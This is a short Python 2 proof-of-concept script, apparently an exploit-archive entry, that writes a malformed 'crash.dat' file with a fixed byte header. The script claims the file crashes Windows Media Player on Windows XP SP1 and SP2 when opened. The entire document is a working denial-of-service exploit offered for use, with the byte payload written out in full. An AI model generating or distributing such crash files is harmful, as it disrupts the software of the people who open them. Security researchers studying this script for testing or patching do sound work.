#!usr/bin/python
#Windows Media DAT File Denial Of Service Vulnerability
#Open the file with ur WMP and see it die."
import sys
print "+---------------------------------+"
print "+ WMP .DAT file Denial of Service"
print "+ Author: Cn4phux"
print "+ mail: Cn4phux[at]gmail[dot]com"
print "+ Tested on Windows XP (SP1,SP2)"
print "+--------------------------------+"
print "n\Starting . . ."
crasher="crash.dat"
permission='wb'
buffer_openning = open(crasher,permission)
buffer_openning.write('\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00')
buffer_openning.close();print "Created . . ."
